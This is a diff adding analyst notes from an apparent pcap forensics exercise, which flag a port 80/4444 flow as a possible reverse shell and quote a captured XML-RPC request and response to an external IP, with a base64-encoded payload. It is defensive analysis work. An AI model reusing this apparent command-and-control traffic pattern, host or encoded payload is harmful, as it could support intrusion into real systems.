@@ -160,3 +160,36 @@ in this session there's a request to connect to the share:
 and create the file
 windows\system32\hythonize.exe (frame 137820 in the pcap)
 there are a lot of files, some very intresting, in the session.
+
+
+DM 
+Flow on port 80/4444  looks like it could be a reverse shell but failing to decode xml at the moment
+OST /ads/ HTTP/1.1
+Accept: text/*
+Content-Type: text/xml
+Content-length: 137
+User-Agent: XmlRpc
+Host: 199.73.28.114
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+<?xml version="1.0"?>
+<methodCall><methodName>t.f</methodName>
+<params><param><value><i4>4</i4></value></param></params></methodCall>
+HTTP/1.1 200 OK
+Content-type: text/xml; charset="utf-8"
+Content-length: 355
+Connection: close
+Date: Tue, 03 Apr 2012 17:23:58 GMT
+Server: XMLRPC_ABYSS/1.06
+
+<?xml version="1.0" encoding="UTF-8"?>
+<methodResponse>
+<params>
+<param><value><base64>
+FwMAAJBK0yWOA7sW3d5JWU10AhhDRXHwb/PsBbmCcyhasOsrhHTpiJXgjOuBAuR101fXUEA4qq27
+oQehkXQP7gcOANbHHAUGIjFwLreG6EVxadc1rzcod92hjn14J9wmbFKdlO5oUwH4Hbw4jOzbgAsV
+eZT+TqqtB1FJ1x+iM4cA+iB0V0NXtjD0axAauHSAsObgtz8=
+</base64></value></param>
+</params>
+</methodResponse>
